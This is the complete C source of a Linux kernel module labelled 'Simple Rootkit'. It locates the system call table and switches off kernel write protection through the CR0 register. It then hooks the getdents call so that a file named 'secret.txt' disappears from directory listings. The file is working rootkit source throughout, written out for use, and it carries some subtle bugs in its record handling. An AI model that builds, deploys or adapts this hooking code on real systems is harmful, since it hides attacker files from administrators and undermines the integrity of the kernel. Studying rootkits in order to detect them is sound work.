#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h>

#define DRIVER_AUTHOR "Neelesh Ranjan Jha"
#define DRIVER_DESCRIPTION "Simple Rootkit"

MODULE_LICENSE("GPL");
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESCRIPTION);

unsigned long **SYS_CALL_TABLE;

void EnablePageWriting(void)
{
	write_cr0(read_cr0() & (~0x10000));  //function to write to cr0 register when cr0 register is being read and not 0x10000
}
//Opens memory pages to be written
void DisablePageWriting(void)
{
	write_cr0(read_cr0() | 0x10000); //function to write
}
//Closes memory pages to be written


struct linux_dirent
{
  unsigned long d_ino; //inode number
  unsigned long d_off; //offset after which next linux_dirent structure starts
  unsigned short d_reclen; //record length, new record starts after this length
  char d_name[]; //filename and it's length(size) max can be 256 in linux
}*dirp2, *dirp3, *retn; //directory pointers


char hide[]="secret.txt"; //name of file we want to hide

asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);

//Create Our version of Open Function.
asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

  struct linux_dirent *retn, *dirp3;
  int Records, RemainingBytes, length;

  Records = (*original_getdents) (fd, dirp, count);

  if (Records <= 0){
    return Records;
  }

  retn = (struct linux_dirent *) kmalloc(Records, GFP_KERNEL); //this is  the return structure, we allocate memory to the kernel space(similar to using malloc which
                                                                                                                                          //allocates to user space)
  copy_from_user(retn, dirp, Records); //Copy the structure to our memory allocated in kernel space

  dirp3 = retn; //we will iterate through this strucuture using dirp3
  RemainingBytes = Records;


  while(RemainingBytes > 0) //Reamining Bytes tell us how many records we have
  {
    length = dirp3->d_reclen;
    RemainingBytes -= dirp3->d_reclen; //this gives us a pointer to the next structure

    printk(KERN_INFO "RemainingBytes %d   \t File: %s " ,  RemainingBytes , dirp3->d_name );

    if(strcmp( (dirp3->d_name) , hide ) == 0){
      memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes); //this will select the file we need to hide + next file
      Records -= length;
    }
    dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen); //move pointer around to move to next structure

  }

  copy_to_user(dirp, retn, Records);   // Copy from kernel to userspace
  kfree(retn); //free memory
  return Records;
}


static int __init SetHooks(void) {
	// Gets Syscall Table
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table");

	printk(KERN_INFO "System Call Change Enabled.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);


	EnablePageWriting();// Opens the memory pages to be written


	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents]; //Pointer of Syscall_open is repalced and points to our function HookeGetDents
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
	DisablePageWriting(); //closes memory to be written

	return 0;
}


static void __exit HookCleanup(void) {

	EnablePageWriting();
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents; //Point to original SYS_CALL_TABLE
	DisablePageWriting();

	printk(KERN_INFO "Everything back to normal.");
}

module_init(SetHooks);
module_exit(HookCleanup);
